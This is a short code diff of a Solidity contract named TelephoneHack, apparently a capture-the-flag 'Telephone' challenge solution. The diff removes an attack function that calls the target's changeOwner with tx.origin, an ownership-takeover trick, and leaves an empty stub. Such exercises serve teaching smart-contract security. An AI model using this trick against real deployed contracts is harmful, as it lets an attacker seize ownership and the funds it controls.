@@ -13,9 +13,5 @@ contract TelephoneHack {
         challenge = ITelephone(challengeAddress);
     }
 
-    function attack() external payable {
-        challenge.changeOwner(tx.origin);
-    }
-
-    fallback() external payable {}
+    function attack() external payable {}
 }
